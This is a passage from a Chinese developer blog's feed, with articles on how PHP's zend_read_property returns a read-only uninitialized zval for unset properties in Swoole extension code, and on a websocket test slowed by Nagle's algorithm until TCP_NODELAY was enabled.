href="https://github.com/swoole/grpc" target="_blank" rel="noopener">Grpc/Etcd</a>客户端</li></ul><h4 id="2018年末-2019年初"><a href="#2018年末-2019年初" class="headerlink" title="2018年末~2019年初"></a>2018年末~2019年初</h4><ul><li>对<a href="https://github.com/swoole/swoole-src" target="_blank" rel="noopener">Swoole</a>整体进行了大量优化及重构，推进了协程特性的发展，遂成为项目Owner之一</li></ul><h4 id="2019年4月"><a href="#2019年4月" class="headerlink" title="2019年4月"></a>2019年4月</h4><ul><li>进入<a href="https://www.100tal.com/" target="_blank" rel="noopener">北京好未来学而思</a>实习，并就Swoole进行了一系列技术分享</li></ul><h4 id="2019年6月"><a href="#2019年6月" class="headerlink" title="2019年6月"></a>2019年6月</h4><ul><li>回校，体验珍惜也枉然，不出意外的离别，然后离别</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;大学四年，出于兴趣和热爱，我大概经历了以下这些事情：&lt;/p&gt;
&lt;p&gt;知乎带图链接：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/71304826&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://zhuanlan.zhihu.com/p/71304826&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="大学" scheme="http://www.twosee.cn/tags/%E5%A4%A7%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>PHP内核浅析: zend_read_property在键值不存在的时候究竟返回了什么?</title>
    <link href="http://www.twosee.cn/2018/09/23/what-are-zend-read-property-doing/"/>
    <id>http://www.twosee.cn/2018/09/23/what-are-zend-read-property-doing/</id>
    <published>2018-09-23T13:06:26.000Z</published>
    <updated>2020-07-17T10:28:24.412Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020更新：扩展对象使用“属性”来存储东西不是一个好的行为，我们可能需要花费很大代价来阻止来自PHP用户的破坏，至于更好的存储方法，我会在未来的文章中讲到</p></blockquote><p><code>zend_read_property</code>返回了什么, 其实我从前也未深究, 它的返回值类型是一个<code>zval *</code>, 所以很理所当然的, 大家都会认为如果获取了一个不存在的属性, 它的返回值就是<code>NULL</code>.</p><p>比如<code>zend_hash_str_find</code>这个API, 它会从<code>HashTable</code>里寻找对应的bucket, 然后获取它的值, 如果这个值不存在, 就返回NULL.</p><p>而且我们清楚, 不管是<code>array</code>, 还是<code>object</code>的<code>properties</code>, 都是用<code>HashTable</code>来存储的, 那么不存在的时候返回<code>NULL</code>, 也是理所当然.</p><p>这里还要注意一点, 我所指的不存在, 是在<code>HashTable</code>里没有这个bucket, 举个例子:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$foo = [<span class="string">'bar'</span> =&gt; <span class="keyword">null</span>];</span><br><span class="line">var_dump(<span class="keyword">isset</span>($foo[<span class="string">'bar'</span>])); <span class="comment">// false</span></span><br><span class="line">var_dump(array_key_exists(<span class="string">'bar'</span>, $foo)); <span class="comment">// true</span></span><br><span class="line"><span class="keyword">unset</span>($foo[<span class="string">'bar'</span>]);</span><br><span class="line">var_dump(array_key_exists(<span class="string">'bar'</span>, $foo)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>这样可以很清楚的发现区别了, 在置一个键为<code>null</code>的时候, 实际上是在这个<code>bucket</code>上放了一个<code>type = null</code>的<code>zval</code>,  而当使用<code>unset</code>的时候, 才是真正的把这个<code>bucket</code>从<code>HashTable</code>上删去了, 也就是说这个键和存储键值的容器都不存在了. 所以<code>unset</code>真是个很暴力的连根拔除的操作.</p><p><code>unset</code>的开销会比赋值<code>null</code>更大, 因为它删去属性的同时, 可能会触发数组结构重置, 这个问题在用<code>SplQueue</code>和<code>array_push/pop</code>对比的时候显而易见.</p><a id="more"></a><h3 id="错误案例"><a href="#错误案例" class="headerlink" title="错误案例"></a>错误案例</h3><p>出于安全性考虑, 我曾经写过一个函数, 犯了愚蠢的错误:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> sw_inline zval* <span class="title">sw_zend_read_property_array</span><span class="params">(zend_class_entry *class_ptr, zval *obj, <span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> len, <span class="keyword">int</span> silent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    zval rv, *property = zend_read_property(class_ptr, obj, s, len, silent, &amp;rv);</span><br><span class="line">    zend_uchar ztype = Z_TYPE_P(property);</span><br><span class="line">    <span class="keyword">if</span> (ztype != IS_ARRAY)</span><br><span class="line">    &#123;</span><br><span class="line">        zval temp_array;</span><br><span class="line">        array_init(&amp;temp_array);</span><br><span class="line">        zend_update_property(class_ptr, obj, s, len, &amp;temp_array TSRMLS_CC);</span><br><span class="line">        zval_ptr_dtor(&amp;temp_array);</span><br><span class="line">        <span class="comment">// NOTICE: if user unset the property, this pointer will be changed</span></span><br><span class="line">        <span class="comment">// some objects such as `swoole_http2_request` always be writable</span></span><br><span class="line">        <span class="keyword">if</span> (ztype == IS_UNDEF)</span><br><span class="line">        &#123;</span><br><span class="line">            property = zend_read_property(class_ptr, obj, s, len, silent, &amp;rv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> property;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这个函数是用来安全地从一个object上获取一个array类型的属性, 在该属性不为array类型的时候, 更新为一个空数组, 然后再返回该属性的指针.</p><p>因为在底层常常会有类似这样的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zval *property = zend_read_property(ce, object, ZEND_STRL(<span class="string">"headers"</span>), <span class="number">1</span>);</span><br><span class="line">add_assoc_string(property, <span class="string">"foo"</span>, <span class="string">"bar"</span>);</span><br></pre></td></tr></table></figure><p>一般属性都是被定义好的且初始化好的, 但难免有开发者会在PHP代码中改变它, 比如我自己就这么做了, 在某个清理方法中把<code>$request-&gt;headers = null</code>, 然后底层读取出了一个null的zval, 调用<code>add_assoc_string</code>的时候, 把这个属性当做了array, 就产生了coredump. 所以弄一个包含检查的内联函数来安全的获取指定类型的属性, 还是很有必要的.</p><p>在这个函数中, 我为了节省一次<code>zend_read_property</code>的开销, 判断了前一次读出属性的类型, 在我的潜意识里, 获取到了标记为UNDEF的zval, 前后指针会变化, 所以我判断了它是IS_UNDEF的时候才重新读一次属性. 因为已存在的属性, 就算更新它的值, 它的指针(即bucket的位置)也不会改变.</p><p>我常常是一个实战派, 当时我用LLDB跟踪验证了一下, 不论在何种情况, 前后指针都没有变化, 这是一个安全的方式, 于是我就放心的这么写了.</p><p>后来, 我接二连三在书写极端单元测试的时候遇到问题, 所谓极端单元测试, 是指我时不时的<code>unset</code>掉测试用例里的某个本应该为null的属性, 看看会不会出现问题, 结果产生了一系列coredump.</p><p>后来我发现了, 是因为我写操作了获取到的null zval, 产生了内存错误, 但是为什么不能操作它呢?</p><p>这时候我终于知道去看一眼PHP源码了…马上翻到<code>zend_std_read_property</code>这个标准的handler看一眼:</p><p>入眼就能看到一个:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Z_TYPE_P(rv) != IS_UNDEF) &#123;</span><br><span class="line">    retval = rv;</span><br><span class="line">    <span class="keyword">if</span> (!Z_ISREF_P(rv) &amp;&amp;</span><br><span class="line">        (type == BP_VAR_W || type == BP_VAR_RW  || type == BP_VAR_UNSET)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (UNEXPECTED(Z_TYPE_P(rv) != IS_OBJECT)) &#123;</span><br><span class="line">            zend_error(E_NOTICE, <span class="string">"Indirect modification of overloaded property %s::$%s has no effect"</span>, ZSTR_VAL(zobj-&gt;ce-&gt;name), ZSTR_VAL(name));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    retval = &amp;EG(uninitialized_zval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>潜意识是没错了…在property的unset操作中, unset一个属性, 应该是有可能会将它标记为UNDEF的, 因为一般一个类的实例对象的HashTable是不变动的, unset其实是破坏了其结构的, 标记为UNDEF应该是一种优化.</p><p>但是zend_std_read_property对其进行了包装了, 返回了一个<code>EG(uninitialized_zval)</code>的指针, 这是个什么东西?</p><p>这其实就是个<code>type = null</code>的zval, 比较秀的是, 它是一个挂在<code>executor_globals</code>上的全局量, 便于随时取用作为返回值, 它被设计为只读的, 所以我们的千万不能操作它…</p><p>比如mysqli扩展中就用到了它来判断, 规避了非法的写操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (value != &amp;EG(uninitialized_zval)) &#123;</span><br><span class="line">    convert_to_boolean(value);</span><br><span class="line">    ret = Z_TYPE_P(value) == IS_TRUE ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们应该纠正为(注释是美德)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NOTICE: if user unset the property, zend_read_property will return uninitialized_zval instead of NULL pointer</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(property == &amp;EG(uninitialized_zval)))</span><br><span class="line">&#123;</span><br><span class="line">    property = zend_read_property(class_ptr, obj, s, len, silent, &amp;rv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个包装是很好的, 保证了API返回的一定是一个<strong>可读的zval</strong>, 但是PHP底层的文档实在是太少了, 尤其是中国的开发者, 很难在网上找到任何有价值的东西, 需要一定的源码阅读能力和耐心才行, 否则经常会遇上这种非直觉的设计, 就是地狱难度的开发.</p><blockquote><p>该API起码自PHP7起就一直如此设计, 使用<code>git blame</code>来查看API变动也是良好的习惯之一, 因为ZendVM经常会有一些你意想不到的API改动…</p><p><a href="https://github.com/php/php-src/blob/2bf8f29d16e6875e65eaa538a9740aac31ce650a/Zend/zend_object_handlers.c" target="_blank" rel="noopener">https://github.com/php/php-src/blob/2bf8f29d16e6875e65eaa538a9740aac31ce650a/Zend/zend_object_handlers.c</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;2020更新：扩展对象使用“属性”来存储东西不是一个好的行为，我们可能需要花费很大代价来阻止来自PHP用户的破坏，至于更好的存储方法，我会在未来的文章中讲到&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;zend_read_property&lt;/code&gt;返回了什么, 其实我从前也未深究, 它的返回值类型是一个&lt;code&gt;zval *&lt;/code&gt;, 所以很理所当然的, 大家都会认为如果获取了一个不存在的属性, 它的返回值就是&lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;比如&lt;code&gt;zend_hash_str_find&lt;/code&gt;这个API, 它会从&lt;code&gt;HashTable&lt;/code&gt;里寻找对应的bucket, 然后获取它的值, 如果这个值不存在, 就返回NULL.&lt;/p&gt;
&lt;p&gt;而且我们清楚, 不管是&lt;code&gt;array&lt;/code&gt;, 还是&lt;code&gt;object&lt;/code&gt;的&lt;code&gt;properties&lt;/code&gt;, 都是用&lt;code&gt;HashTable&lt;/code&gt;来存储的, 那么不存在的时候返回&lt;code&gt;NULL&lt;/code&gt;, 也是理所当然.&lt;/p&gt;
&lt;p&gt;这里还要注意一点, 我所指的不存在, 是在&lt;code&gt;HashTable&lt;/code&gt;里没有这个bucket, 举个例子:&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$foo = [&lt;span class=&quot;string&quot;&gt;&#39;bar&#39;&lt;/span&gt; =&amp;gt; &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var_dump(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($foo[&lt;span class=&quot;string&quot;&gt;&#39;bar&#39;&lt;/span&gt;])); &lt;span class=&quot;comment&quot;&gt;// false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var_dump(array_key_exists(&lt;span class=&quot;string&quot;&gt;&#39;bar&#39;&lt;/span&gt;, $foo)); &lt;span class=&quot;comment&quot;&gt;// true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unset&lt;/span&gt;($foo[&lt;span class=&quot;string&quot;&gt;&#39;bar&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var_dump(array_key_exists(&lt;span class=&quot;string&quot;&gt;&#39;bar&#39;&lt;/span&gt;, $foo)); &lt;span class=&quot;comment&quot;&gt;// false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样可以很清楚的发现区别了, 在置一个键为&lt;code&gt;null&lt;/code&gt;的时候, 实际上是在这个&lt;code&gt;bucket&lt;/code&gt;上放了一个&lt;code&gt;type = null&lt;/code&gt;的&lt;code&gt;zval&lt;/code&gt;,  而当使用&lt;code&gt;unset&lt;/code&gt;的时候, 才是真正的把这个&lt;code&gt;bucket&lt;/code&gt;从&lt;code&gt;HashTable&lt;/code&gt;上删去了, 也就是说这个键和存储键值的容器都不存在了. 所以&lt;code&gt;unset&lt;/code&gt;真是个很暴力的连根拔除的操作.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;unset&lt;/code&gt;的开销会比赋值&lt;code&gt;null&lt;/code&gt;更大, 因为它删去属性的同时, 可能会触发数组结构重置, 这个问题在用&lt;code&gt;SplQueue&lt;/code&gt;和&lt;code&gt;array_push/pop&lt;/code&gt;对比的时候显而易见.&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
      <category term="zend" scheme="http://www.twosee.cn/tags/zend/"/>
    
      <category term="swoole" scheme="http://www.twosee.cn/tags/swoole/"/>
    
  </entry>
  
  <entry>
    <title>用0.04秒看出大佬的网络编程基本功素养</title>
    <link href="http://www.twosee.cn/2018/09/16/tcp-nodelay/"/>
    <id>http://www.twosee.cn/2018/09/16/tcp-nodelay/</id>
    <published>2018-09-16T15:32:08.000Z</published>
    <updated>2018-09-19T07:30:15.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>  事情是这样的, 最近在做Swoole的Websocket的底层代码优化, 和编写更多的单元测试来保证代码正确和功能的稳定性, 写了很多高质量的”混沌”测试, 好吧, 其实并不是那么混沌, 只是这个词眼看起来很帅.<br>以往的unit tests更像是一些带着assert的examples, 加之phpt的测试风格, 顶多再来个EXPECT(F/REGEX)的预期输出对比, 只能测试出这个功能能否跑通, 并没有覆盖到功能的健壮性.而每当底层出现BUG接着我们很快就发现了原因时, 都会感叹单元测试不够全面和完善.<br>  所以在新写的测试中, 我尽量引入随机数据和一定量的并发压力来简单的模拟各种情况, 在自动化的单元测试中这样的做法已经是权衡了测试敏捷和健全的最优解了, 比如以下这个名为<code>websocket-fin</code>的测试:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$count = <span class="number">0</span>;</span><br><span class="line">$pm = <span class="keyword">new</span> ProcessManager;</span><br><span class="line">$pm-&gt;parentFunc = <span class="function"><span class="keyword">function</span> <span class="params">(int $pid)</span> <span class="title">use</span> <span class="params">($pm, &amp;$count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($c = MAX_CONCURRENCY; $c--;) &#123;</span><br><span class="line">        go(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($pm, &amp;$count)</span> </span>&#123;</span><br><span class="line">            $cli = <span class="keyword">new</span> \Swoole\Coroutine\Http\Client(<span class="string">'127.0.0.1'</span>, $pm-&gt;getFreePort());</span><br><span class="line">            $cli-&gt;set([<span class="string">'timeout'</span> =&gt; <span class="number">5</span>]);</span><br><span class="line">            $ret = $cli-&gt;upgrade(<span class="string">'/'</span>);</span><br><span class="line">            assert($ret);</span><br><span class="line">            $rand_list = [];</span><br><span class="line">            $times = MAX_REQUESTS;</span><br><span class="line">            <span class="keyword">for</span> ($n = $times; $n--;) &#123;</span><br><span class="line">                $rand = openssl_random_pseudo_bytes(mt_rand(<span class="number">0</span>, <span class="number">1280</span>));</span><br><span class="line">                $rand_list[] = $rand;</span><br><span class="line">                $opcode = $n === $times - <span class="number">1</span> ? WEBSOCKET_OPCODE_TEXT : WEBSOCKET_OPCODE_CONTINUATION;</span><br><span class="line">                $finish = $n === <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (mt_rand(<span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                    $frame = <span class="keyword">new</span> swoole_websocket_frame;</span><br><span class="line">                    $frame-&gt;opcode = $opcode;</span><br><span class="line">                    $frame-&gt;data = $rand;</span><br><span class="line">                    $frame-&gt;finish = $finish;</span><br><span class="line">                    $ret = $cli-&gt;push($frame);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $ret = $cli-&gt;push($rand, $opcode, $finish);</span><br><span class="line">                &#125;</span><br><span class="line">                assert($ret);</span><br><span class="line">            &#125;</span><br><span class="line">            $frame = $cli-&gt;recv();</span><br><span class="line">            <span class="keyword">if</span> (assert($frame-&gt;data === implode(<span class="string">''</span>, $rand_list))) &#123;</span><br><span class="line">                $count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    swoole_event_wait();</span><br><span class="line">    assert($count === MAX_CONCURRENCY);</span><br><span class="line">    $pm-&gt;kill();</span><br><span class="line">&#125;;</span><br><span class="line">$pm-&gt;childFunc = <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($pm)</span> </span>&#123;</span><br><span class="line">    $serv = <span class="keyword">new</span> swoole_websocket_server(<span class="string">'127.0.0.1'</span>, $pm-&gt;getFreePort(), mt_rand(<span class="number">0</span>, <span class="number">1</span>) ? SWOOLE_BASE : SWOOLE_PROCESS);</span><br><span class="line">    $serv-&gt;set([</span><br><span class="line">        <span class="string">'log_file'</span> =&gt; <span class="string">'/dev/null'</span></span><br><span class="line">    ]);</span><br><span class="line">    $serv-&gt;on(<span class="string">'WorkerStart'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($pm)</span> </span>&#123;</span><br><span class="line">        $pm-&gt;wakeup();</span><br><span class="line">    &#125;);</span><br><span class="line">    $serv-&gt;on(<span class="string">'Message'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(swoole_websocket_server $serv, swoole_websocket_frame $frame)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mt_rand(<span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">            $serv-&gt;push($frame-&gt;fd, $frame);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $serv-&gt;push($frame-&gt;fd, $frame-&gt;data, $frame-&gt;opcode, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    $serv-&gt;start();</span><br><span class="line">&#125;;</span><br><span class="line">$pm-&gt;childFirst();</span><br><span class="line">$pm-&gt;run();</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h2><p>  Swoole中涉及网络服务的测试模型一般都长这样, 一个PHP写的简易好用的<code>ProcessManager</code>来管理进程, 子进程(childFunc)一般为服务, 父进程(parentFunc)一般为客户端, 来测试收发处理是否正确.</p><p>  首先子进程会先运行(<code>childFirst</code>), 服务创建成功后, 会进入<code>onWorkerStart</code>回调, 此时服务已经能进行请求处理, 通过<code>wakeup</code>唤起父进程,父进程会顺序执行, 创建多个协程, 在<code>swoole_event_wait</code>处进入事件循环, 待所有协程运行完毕后, 断言执行成功次数是否正确, 然后kill掉进程退出测试.</p><p>  在这里我们并发了<code>MAX_CONCURRENCY</code>个数的协程来请求服务器(相当于<code>ab测试</code>的<code>-c</code>参数), 这里使用<code>MAX_CONCURRENCY</code>常量的原因是<code>TravisCI</code>(线上自动化集成测试)的配置并不是那么好, 不一定能承载住稍大的并发, 常量的值可以在不同环境下有所区别, 而积极使用常量也能让一个程序的可读性, 可移植性大大提升.</p><p>  每个协程里都创建一个HTTP客户端(连接), 连接建立后, 通过<code>upgrade</code>升级到websocket协议, 执行<code>MAX_REQUESTS</code>次(相当于<code>ab测试</code>的<code>-n</code>参数)的请求逻辑, 每一次都会通过<code>openssl_random_pseudo_bytes</code>来生成一串0~1280字节的随机字符串, 添加到<code>$rand_list</code>的同时向服务器发送.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$opcode = $n === $times - <span class="number">1</span> ? WEBSOCKET_OPCODE_TEXT : WEBSOCKET_OPCODE_CONTINUATION;</span><br><span class="line">$finish = $n === <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>  这两句代码的意思是, 在websocket中使用<code>分段发送帧</code>的时候, 第一帧的opcode是确切的帧类型(这里是TEXT), fin为0, 代表帧未结束, 后续帧的opcode都是<code>WEBSOCKET_OPCODE_CONTINUATION</code>, 表示这是一个连续帧, 直到最后一帧(n==0循环结束)fin变为1, 代表帧结束.</p><p>  这个连续帧最多有<code>MAX_REQUESTS</code>帧, 值一般为100, 1280字节*100次也就是最大128K左右, 这个测试量也就是稀松平常, 对于swoole来说并不算是有什么压力, 称不上压力测试, 只是通过随机数据来尽可能保证各种情况下的可用性.</p><h2 id="蜜汁耗时"><a href="#蜜汁耗时" class="headerlink" title="蜜汁耗时"></a>蜜汁耗时</h2><p>  而恰好我又在最近为自动化测试加上了一个耗时统计选项, 很奇怪的结果出现了, fin测试居然耗时超过20s, 这个问题在我的MacOS下并不存在, 但是却在Ubuntu复现了.</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWgy1fveqbea7h9j31fs0h4qaw.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>  同样出现问题的还有greeter测试, 它们都有一个共同的问题, 就是它们使用了<strong>websocket通信单个连接多次发包.</strong></p><p>  BUG能在Ubuntu下复现是个好事, 因为MacOS除了<code>LLDB</code>根本没有好用的调试工具, <code>valgrind</code>不可用, 而<code>strace</code>的替代品<code>dtruss</code>也不甚好用, 在Ubuntu下使用<code>strace</code>跟踪, 很快就能看到以下日志:</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWgy1fveu8j5bqcj31j616e1kx.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>  如果是使用标准输出跟踪可以看到打印的信息非常正常, 由于数据量大屏幕会不断滚动, 但并没有出现卡顿, 数据传输也很均匀, 可以看到有很多<code>getpid</code>的系统调用, 第一反应是是不是这个的问题, 稍微确认一下就能发现这是<code>openssl_random_pseudo_bytes</code>的系统调用, 并没有什么关系.</p><h2 id="前辈经验"><a href="#前辈经验" class="headerlink" title="前辈经验"></a>前辈经验</h2><p>  量大就慢是不可能的, 在MacOS下完成这个脚本只需眨眼之间, 且没有任何错误, 苦思了半天也不得解, 只能求助rango, rango刚开始看思路和我差不多, 也是先看到了大量的<code>getpid</code>, 稍加思索马上就排除了这个, 在标准输出中跟踪也发现非常正常, 然后觉得是不是数据量太大了, 但是稍加确认又马上排除.</p><p>  很快, 他就注意到了epoll_wait的等待时间格外的长, 虽然我也注意到了, 但我只注意到了格外的长, 并没有留意长出来的时间是多少, 数据是不间断连续发送的, 却有<strong>40ms</strong>的延迟, 这对于本机的两端互发数据来说是一个很大的值了.</p><p>  “0.04s, 不会是那个吧”, 说罢rango马上<strong>在配置项加上了一个<code>open_tcp_nodelay =&gt; false</code>, 再跑一次测试, 问题解决…</strong></p><p>  这就是名震江湖的<strong>调参术</strong>吗…像以前用windows的时候, 经常能看到一个水文, <strong><code>一招让你电脑网速提升20%</code></strong>  , 大概是通过配置关闭了TCP的<strong>慢启动</strong>, 让测速结果更加好看, 实际上可能并没有什么效果, 反而让这个优秀的设计在相关网络场景下失去效用, 造成<strong>拥塞</strong>.</p><p>  但是这个东西完全是关于<strong><code>基本功</code>和<code>经验</code></strong>, 我压根不知道这个东西, 看破脑袋也看不出这个关键的40ms, 而我没有相关的经验, 就算有相关的网络编程知识也一时很难联系起来.</p><p>##TCP_NOLAY 与 Nagle合并算法</p><p>  开启  <code>TCP_NOLAY</code>实际是关闭<code>Nagle合并算法</code>, 这个算法在网上的讲解有很多, 而且原理也非常简单, 写的肯定比我好多了, 如维基上的伪码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> there is <span class="keyword">new</span> data to send</span><br><span class="line">  <span class="keyword">if</span> the window <span class="built_in">size</span> &gt;= MSS <span class="keyword">and</span> <span class="built_in">available</span> data is &gt;= MSS</span><br><span class="line">    send complete MSS segment now</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> there is unconfirmed data still in the pipe</span><br><span class="line">      enqueue data in the <span class="built_in">buffer</span> until an acknowledge is received</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      send data immediately</span><br><span class="line">    <span class="built_in">end</span> <span class="keyword">if</span></span><br><span class="line">  <span class="built_in">end</span> <span class="keyword">if</span></span><br><span class="line"><span class="built_in">end</span> <span class="keyword">if</span></span><br></pre></td></tr></table></figure><p> 而<a href="https://www.zhihu.com/question/42308970/answer/246334766" target="_blank" rel="noopener">Nagle算法是时代的产物，因为当时网络带宽有限</a>, 于是我就把Swoole的<code>TCP_NODELAY</code>改为默认开启了, 不要急, <a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#tcp_nodelay" target="_blank" rel="noopener">Nginx-tcp_nodelay</a>和php_stream等也是这么做的, 大家都有自己的缓冲区, 无需立即发送的小数据包是不会马上发出去的, 例如最重要的HTTP, 它是<code>读-写-读-写</code>模式的, 数据都是等请求<code>end</code>了之后才会一并发出(除非使用了chunk), 也就是说, 如果数据确实发出了, 那么它就有发出的必要性(哪怕它是个小数据包), 